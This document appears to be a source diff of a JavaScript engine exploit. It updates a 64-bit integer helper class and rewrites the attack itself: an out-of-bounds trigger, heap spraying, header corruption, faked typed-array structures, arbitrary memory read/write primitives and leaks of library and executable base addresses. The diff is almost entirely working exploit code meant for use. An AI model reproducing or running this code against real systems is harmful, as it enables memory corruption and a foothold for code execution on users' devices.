@@ -14,6 +14,8 @@ class BigInt {
     this.f64 = new Float64Array(this.buf)
 
     switch (arguments.length) {
+      case 0:
+        break
       case 1:
         var [val] = arguments
         switch (typeof val) {
@@ -27,25 +29,22 @@ class BigInt {
             break
           case 'string':
             if (val.startsWith('0x')) {
-              val = val.substring(2)
+              val = val.slice(2)
             }
 
-            if (val.length > this.u8.byteLength * 2) {
+            if (val.length > this.u8.length * 2) {
               throw new RangeError(`value ${val} is out of range !!`)
             }
 
+            while (val.length < this.u8.length * 2) {
+              val = '0' + val
+            }
+
             for (var i = 0; i < this.u8.length; i++) {
-              var b = 0
-
-              var str_idx = i * 2
-              if (str_idx < val.length) {
-                var start = str_idx
-                var end = Math.min(str_idx + 2, val.length)
-                var b_str = val.slice(start, end)
-                b = parseInt(b_str, 16)
-              }
-
-              this.u8[this.u8.length - 1 - i] = b
+              var start = val.length - 2 * (i + 1)
+              var end = val.length - 2 * i
+              var b = val.slice(start, end)
+              this.u8[i] = parseInt(b, 16)
             }
 
             break
@@ -90,6 +89,23 @@ class BigInt {
     }
   }
 
+  toString () {
+    var val = '0x'
+    for (var i = this.u8.length - 1; i >= 0; i--) {
+      var c = this.u8[i].toString(16).toUpperCase()
+      val += c.length === 1 ? '0' + c : c
+    }
+    return val
+  }
+
+  endian () {
+    for (var i = 0; i < this.u8.length / 2; i++) {
+      var b = this.u8[i]
+      this.u8[i] = this.u8[this.u8.length - 1 - i]
+      this.u8[this.u8.length - 1 - i] = b
+    }
+  }
+
   lo () {
     return this.u32[0]
   }
@@ -99,94 +115,174 @@ class BigInt {
   }
 
   d () {
-    if (this.u8[7] === 0xff && (this.u8[6] === 0xff || this.u8[6] === 0xff)) {
-      throw new RangeError('NaN')
+    if (this.u8[7] === 0xFF && (this.u8[6] === 0xFF || this.u8[6] === 0xFE)) {
+      throw new RangeError('Integer value cannot be represented by a double')
     }
 
     return this.f64[0]
   }
 
   jsv () {
-    if ((this.u8[7] === 0 && this.u8[6] === 0) || (this.u8[7] === 0xff && this.u8[6] === 0xff)) {
-      throw new RangeError('NaN')
+    if ((this.u8[7] === 0 && this.u8[6] === 0) || (this.u8[7] === 0xFF && this.u8[6] === 0xFF)) {
+      throw new RangeError('Integer value cannot be represented by a JSValue')
     }
 
-    var bit = new BigInt(0x10000, 0)
-
-    this.sub(bit)
-    var val = this.f64[0]
-    this.add(bit)
-
-    return val
+    return this.sub(new BigInt(0x10000, 0)).d()
   }
 
-  endian () {
-    this.u8.reverse()
-  }
-
-  toString () {
-    var val = '0x'
-    for (var i = this.u8.length - 1; i >= 0; i--) {
-      var c = this.u8[i].toString(16)
-      val += c.length === 1 ? '0' + c : c
+  cmp (val) {
+    if (this.hi() > val.hi()) {
+      return 1
     }
-    return val
+
+    if (this.hi() < val.hi()) {
+      return -1
+    }
+
+    if (this.lo() > val.lo()) {
+      return 1
+    }
+
+    if (this.lo() < val.lo()) {
+      return -1
+    }
+
+    return 0
+  }
+
+  eq (val) {
+    return this.hi() === val.hi() && this.lo() === val.lo() 
+  }
+
+  neq (val) {
+    return this.hi() != val.hi() || this.lo() != val.lo()
+  }
+
+  gt (val) {
+    return this.cmp(val) > 0
+  }
+
+  gte (val) {
+    return this.cmp(val) >= 0
+  }
+
+  lt (val) {
+    return this.cmp(val) < 0
+  }
+
+  lte (val) {
+    return this.cmp(val) <= 0
   }
 
   add (val) {
-    var res = new Uint8Array(this.buf.byteLength)
+    var ret = new BigInt()
 
     var c = 0
     for (var i = 0; i < this.buf.byteLength; i++) {
       var b = this.u8[i] + val.u8[i] + c
-      c = (b > 0xff) | 0
-      res[i] = b
+      c = (b > 0xFF) | 0
+      ret.u8[i] = b
     }
 
-    return new BigInt(res)
+    return ret
   }
 
   sub (val) {
-    var res = new Uint8Array(this.buf.byteLength)
+    var ret = new BigInt()
 
     var c = 0
     for (var i = 0; i < this.buf.byteLength; i++) {
       var b = this.u8[i] - val.u8[i] - c
       c = (b < 0) | 0
-      res[i] = b
+      ret.u8[i] = b
     }
 
-    return new BigInt(res)
+    return ret
+  }
+
+  mul (val) {
+    var ret = new BigInt()
+
+    var c = 0
+    for (var i = 0; i < this.buf.byteLength; i++) {
+      var s = c
+      for (var j = 0; j <= i; j++) {
+        s += this.u8[j] * (val.u8[i - j] || 0)
+      }
+
+      ret.u8[i] = s & 0xFF
+      c = s >>> 8
+    }
+
+    if (c !== 0) {
+      throw new Error("mul overflowed !!")
+    }
+
+    return ret
+  }
+
+  divmod (val) {
+    if (!val.gte(BigInt.Zero)) {
+      throw new Error("Division by zero")
+    }
+
+    var q = new BigInt()
+    var r = new BigInt()
+
+    for (var b = (this.buf.byteLength * 8) - 1; b >= 0; b--) {
+      r = r.shl(1)
+
+      var byte_idx = Math.floor(b / 8)
+      var bit_idx = b % 8
+
+      r.u8[0] |= (this.u8[byte_idx] >> bit_idx) & 1
+
+      if (r.gte(val)) {
+        r = r.sub(val)
+
+        q.u8[byte_idx] |= 1 << bit_idx
+      }
+    }
+
+    return { q: q, r: r }
+  }
+
+  div (val) {
+    return this.divmod(val).q
+  }
+
+  mod (val) {
+    return this.divmod(val).r
   }
 
   xor (val) {
-    var res = new Uint8Array(this.buf.byteLength)
+    var ret = new BigInt()
 
     for (var i = 0; i < this.buf.byteLength; i++) {
-      res[i] = this.u8[i] ^ val.u8[i]
+      ret.u8[i] = this.u8[i] ^ val.u8[i]
     }
 
-    return new BigInt(res)
+    return ret
   }
 
   and (val) {
-    var res = new Uint8Array(this.buf.byteLength)
+    var ret = new BigInt()
 
     for (var i = 0; i < this.buf.byteLength; i++) {
-      res[i] = this.u8[i] & val.u8[i]
+      ret.u8[i] = this.u8[i] & val.u8[i]
     }
 
-    return new BigInt(res)
+    return ret
   }
 
   neg () {
-    var res = new Uint8Array(this.buf.byteLength)
+    var ret = new BigInt()
 
     for (var i = 0; i < this.buf.byteLength; i++) {
-      res[i] = ~this.u8[i]
+      ret.u8[i] = ~this.u8[i]
     }
 
-    return new BigInt(res).and(BigInt.One)
+    return ret.and(BigInt.One)
   }
 
   shl (count) {
@@ -194,7 +290,7 @@ class BigInt {
       throw new RangeError(`Shift ${count} bits out of range !!`)
     }
 
-    var res = new Uint8Array(this.buf.byteLength)
+    var ret = new BigInt()
 
     var byte_count = Math.floor(count / 8)
     var bit_count = count % 8
@@ -205,13 +301,13 @@ class BigInt {
 
       if (bit_count) {
         var p = t - 1 >= 0 ? this.u8[t - 1] : 0
-        b = ((b << bit_count) | (p >> (8 - bit_count))) & 0xff
+        b = ((b << bit_count) | (p >> (8 - bit_count))) & 0xFF
       }
 
-      res[i] = b
+      ret.u8[i] = b
     }
 
-    return new BigInt(res)
+    return ret
   }
 
   shr (count) {
@@ -219,7 +315,7 @@ class BigInt {
       throw new RangeError(`Shift ${count} bits out of range !!`)
     }
 
-    var res = new Uint8Array(this.buf.byteLength)
+    var ret = new BigInt()
 
     var byte_count = Math.floor(count / 8)
     var bit_count = count % 8
@@ -233,14 +329,14 @@ class BigInt {
         b = ((b >> bit_count) | (n << (8 - bit_count))) & 0xff
       }
 
-      res[i] = b
+      ret.u8[i] = b
     }
 
-    return new BigInt(res)
+    return ret
   }
 }
 
-BigInt.Zero = new BigInt(0, 0)
+BigInt.Zero = new BigInt()
 BigInt.One = new BigInt(0, 1)
 BigInt.TYPE_MAP = {
   Int8Array: 'i8',
@@ -253,161 +349,118 @@ BigInt.TYPE_MAP = {
   Float64Array: 'f64',
 }
 
-var structs = []
-var oob_arr, slave, master
-var leak_target, leak_target_addr, master_addr
-
-while (true) {
-  var corrupted_idx = -1
-
-  var arr = [1.1]
-  var spray = []
-
-  arr.length = 0x100000
-  arr.splice(0, 0x11)
-  arr.length = 0xfffffff0
-
-  var new_indexing_header = new BigInt(0x100000, 0x100000)
-  for (var i = 0; i < 0x5000; i++) {
-    spray[i] = new Array(0x10).fill(new_indexing_header.d())
-
-    spray[i].p0 = 0.0
-    spray[i].p1 = 0.1
-    spray[i].p2 = 0.2
-    spray[i].p3 = 0.3
-    spray[i].p4 = 0.4
-    spray[i].p5 = 0.5
-    spray[i].p6 = 0.6
-    spray[i].p7 = 0.7
-    spray[i].p8 = 0.8
-    spray[i].p9 = 0.9
-  }
-
-  arr.splice(0x1000, 0, 1)
-
-  for (var i = 0; i < 0x5000; i++) {
-    if (spray[i].length > 0x10) {
-      corrupted_idx = i
-      break
+function make_oob(arr) {
+    var o = {}
+    for (var i in {xx: ""}) {
+        for (i of [arr]) {}
+        o[i]
     }
-  }
 
-  if (corrupted_idx != -1) {
-    oob_arr = spray[corrupted_idx]
-    break
-  }
-
-  log('failed oob, retry...')
+    gc()
 }
 
-log(`corrupted oob array length: ${oob_arr.length}`)
+// needed for rw primitives
+var prim_oob_idx = -1
+var prim_spray_idx = -1
+var prim_marker = new BigInt(0x13371337, 0x13371337) // used to find sprayed array
 
-while (true) {
-  var leak_prim_idx = -1
-  var leak_double_idx = -1
-  var found_prim = false
+// store Uint32Array structure ids to be used for fake master id later 
+var structs = new Array(0x100)
 
-  var prim_spray = []
+// used for rw primitives
+var master, slave
 
-  var prop = new BigInt(0, 0x13371337)
-  for (var i = 0; i < 0x100; i++) {
-    prim_spray[i] = new Array(0x10)
-    prim_spray[i][0] = 13.37
-    prim_spray[i].fill({}, 1)
+// rw primitive leak addresses 
+var leak_obj, leak_obj_addr, master_addr
 
-    prim_spray[i].p0 = prop.d()
-    prim_spray[i].p1 = prop.d()
-    prim_spray[i].p2 = prop.d()
-    prim_spray[i].p3 = prop.d()
-    prim_spray[i].p4 = prop.d()
-    prim_spray[i].p5 = prop.d()
-    prim_spray[i].p6 = prop.d()
-    prim_spray[i].p7 = prop.d()
-    prim_spray[i].p8 = prop.d()
-    prim_spray[i].p9 = prop.d()
-  }
-
-  var marker = new BigInt(0x0, 0x1337)
-  for (var i = 0; i < 0x5000; i++) {
-    var old_val = oob_arr[i]
-
-    if (old_val == undefined) {
-      continue
-    }
-
-    oob_arr[i] = marker.d()
-
-    for (var k = 0; k < 0x100; k++) {
-      if (prim_spray[k].length > 0x10) {
-        found_prim = true
-        leak_prim_idx = k
-        leak_double_idx = i
-
-        oob_arr[i] = old_val
-
-        break
-      }
-    }
-
-    if (found_prim) {
-      break
-    }
-
-    oob_arr[i] = old_val
-  }
-
-  if (found_prim) {
-    slave = new Uint32Array(0x1000)
-
-    slave[0] = 0x13371337
-
-    leak_target = { a: 0, b: 0, c: 0, d: 0 }
-    leak_target.a = slave
-
-    prim_spray[leak_prim_idx][1] = leak_target
-
-    leak_target_addr = new BigInt(oob_arr[leak_double_idx + 2])
-
-    log(`leak_target_addr: ${leak_target_addr}`)
-
-    for (var i = 0; i < 0x100; i++) {
-      var a = new Uint32Array(1)
-      a[
-        Math.random()
-          .toString(36)
-          .replace(/[^a-z]+/g, '')
-          .slice(0, 5)
-      ] = 1337
-      structs.push(a)
-    }
-
-    var rw_target = { a: 0, b: 0, c: 0, d: 0 }
-
-    rw_target.a = new BigInt(0x1602300, 0xc4).d()
-    rw_target.b = 0
-    rw_target.c = slave
-    rw_target.d = 0x1337
-
-    prim_spray[leak_prim_idx][1] = rw_target
-
-    var rw_target_addr = new BigInt(oob_arr[leak_double_idx + 2])
-
-    log(`rw_target_addr: ${rw_target_addr}`)
-
-    rw_target_addr = rw_target_addr.add(new BigInt(0, 0x10))
-
-    oob_arr[leak_double_idx + 2] = rw_target_addr.d()
-
-    master = prim_spray[leak_prim_idx][1]
-
-    master_addr = new BigInt(master[5], master[4])
-
-    break
-  }
-
-  log('failed prim, retry...')
+// spray Uint32Array structure ids
+for (var i = 0; i < structs.length; i++) {
+  structs[i] = new Uint32Array(1)
+  structs[i][`spray_${i}`] = 0x1337
 }
 
+var oob_arr = new Uint32Array(0x40000)
+
+// fake m_hashAndFlags
+oob_arr[4] = 0xB0 
+
+make_oob(oob_arr)
+
+// spray candidates arrays to be used as leak primitive
+var spray = new Array(0x4000)
+for (var i = 0; i < spray.length; i++) {
+    spray[i] = [prim_marker.jsv(), {}]
+}
+
+// find sprayed candidate by marker then corrupt its length 
+for (var i = 0; i < oob_arr.length; i += 2) {
+  var val = new BigInt(oob_arr[i + 1], oob_arr[i])
+  if (val.eq(prim_marker)) {
+    log(`Found marker at oob_arr[${i}] !!`)
+
+    var prim_oob_idx = i - 2
+
+    // corrupt indexing header
+    oob_arr[prim_oob_idx] = 0x1337
+    oob_arr[prim_oob_idx + 1] = 0x1337
+    break
+  }
+}
+
+// find index of corrupted array
+for (var i = 0; i < spray.length; i++) {
+  if (spray[i].length === 0x1337) {
+    log(`Found corrupted primitive at spray[${i}]`)
+
+    prim_spray_idx = i
+    break
+  }
+}
+
+if (prim_oob_idx == -1 || prim_spray_idx == -1) {
+    throw new Error("failed !!")
+}
+
+var prim_oob_obj_idx = prim_oob_idx + 4
+
+slave = new Uint32Array(0x1000)
+slave[0] = 0x13371337
+
+// leak address of leak_obj
+leak_obj = {a: slave, b: 0, c: 0, d: 0}
+
+spray[prim_spray_idx][1] = leak_obj
+
+leak_obj_addr = new BigInt(oob_arr[prim_oob_obj_idx + 1], oob_arr[prim_oob_obj_idx])
+
+// try faking Uint32Array master by incremental structure_id until it matches from one of sprayed earlier in structs array
+var structure_id = 0x80
+while (!(master instanceof Uint32Array)) {
+  var rw_obj = { 
+    js_cell: new BigInt(0x1182300, structure_id++).jsv(), 
+    butterfly: 0, 
+    vector: slave, 
+    length_and_flags: 0x1337 
+  }
+
+  spray[prim_spray_idx][1] = rw_obj
+
+  var rw_obj_addr = new BigInt(oob_arr[prim_oob_obj_idx + 1], oob_arr[prim_oob_obj_idx])
+
+  rw_obj_addr = rw_obj_addr.add(new BigInt(0, 0x10))
+
+  oob_arr[prim_oob_obj_idx] = rw_obj_addr.lo()
+  oob_arr[prim_oob_obj_idx + 1] = rw_obj_addr.hi()
+
+  master = spray[prim_spray_idx][1]
+}
+
+master_addr = new BigInt(master[5], master[4])
+
+log(`Achieved RW primitives !!`)
+log(`master_addr: ${master_addr}`)
+
+// rw primitive
 var prim = {
   read8: function (addr) {
     master[4] = addr.lo()
@@ -437,38 +490,39 @@ var prim = {
     master[5] = addr.hi()
     slave[0] = val
   },
-  leakval: function (jsval) {
-    leak_target.a = jsval
-    return prim.read8(leak_target_addr.add(new BigInt(0, 0x10)))
+  addrof: function (obj) {
+    leak_obj.a = obj
+    return prim.read8(leak_obj_addr.add(new BigInt(0, 0x10)))
   },
 }
+
 /*
 var test = {
 	a: 13.37
 }
 
-log(`test: ${test}`);
-log(`test.a: ${test.a}`);
+log(`test: ${test}`)
+log(`test.a: ${test.a}`)
 
-var addr = prim.leakval(test);
-log(`test addrof: ${addr}`);
+var addr = prim.leakval(test)
+log(`test addrof: ${addr}`)
 
-var a = addr.add(new BigInt(0, 0x10));
+var a = addr.add(new BigInt(0, 0x10))
 
-var val = prim.read8(a);
-log(`addrof(test)+0x10 read8: ${val}`);
-log(`addrof(test)+0x10 read8 double: ${val.d()}`);
+var val = prim.read8(a)
+log(`addrof(test)+0x10 read8: ${val}`)
+log(`addrof(test)+0x10 read8 double: ${val.d()}`)
 
-val = new BigInt(1.1);
-log(`addrof(test)+0x10 write8: ${val}`);
-prim.write8(a, val);
+val = new BigInt(1.1)
+log(`addrof(test)+0x10 write8: ${val}`)
+prim.write8(a, val)
 
-val = prim.read8(a);
-log(`addrof(test)+0x10 read8: ${val}`);
-log(`addrof(test)+0x10 read8 double: ${val.d()}`);
+val = prim.read8(a)
+log(`addrof(test)+0x10 read8: ${val}`)
+log(`addrof(test)+0x10 read8 double: ${val.d()}`)
 */
 
-var math_min_addr = prim.leakval(Math.min)
+var math_min_addr = prim.addrof(Math.min)
 log(`addrof(Math.min): ${math_min_addr}`)
 
 var native_executable = prim.read8(math_min_addr.add(new BigInt(0, 0x18)))
@@ -480,17 +534,17 @@ log(`native_executable_function: ${native_executable_function}`)
 var native_executable_constructor = prim.read8(native_executable.add(new BigInt(0, 0x48)))
 log(`native_executable_constructor: ${native_executable_constructor}`)
 
-var base_addr = native_executable_function.sub(new BigInt(0, 0xc6380))
+var base_addr = native_executable_function.sub(new BigInt(0, 0xC6380))
 
-var _error_addr = prim.read8(base_addr.add(new BigInt(0, 0x1e72398)))
+var _error_addr = prim.read8(base_addr.add(new BigInt(0, 0x1E72398)))
 log(`_error_addr: ${_error_addr}`)
 
-var strerror_addr = prim.read8(base_addr.add(new BigInt(0, 0x1e723b8)))
+var strerror_addr = prim.read8(base_addr.add(new BigInt(0, 0x1E723B8)))
 log(`strerror_addr: ${strerror_addr}`)
 
 var libc_addr = strerror_addr.sub(new BigInt(0, 0x40410))
 
-var jsmaf_gc_addr = prim.leakval(jsmaf.gc)
+var jsmaf_gc_addr = prim.addrof(jsmaf.gc)
 log(`addrof(jsmaf.gc): ${jsmaf_gc_addr}`)
 
 var jsmaf_gc_native_addr = prim.read8(jsmaf_gc_addr.add(new BigInt(0, 0x18)))
@@ -502,8 +556,6 @@ log(`base_addr: ${base_addr}`)
 log(`libc_addr: ${libc_addr}`)
 log(`eboot_addr: ${eboot_addr}`)
 
-// prim.write8(native_executable.add(new BigInt(0, 0x40)), new BigInt(0x41414141, 0x41414141));
+// prim.write8(native_executable.add(new BigInt(0, 0x40)), new BigInt(0x41414141, 0x41414141))
 
-// Math.min(BigInt.One.d());
-
-while (true) {}
+// Math.min(BigInt.One.d())
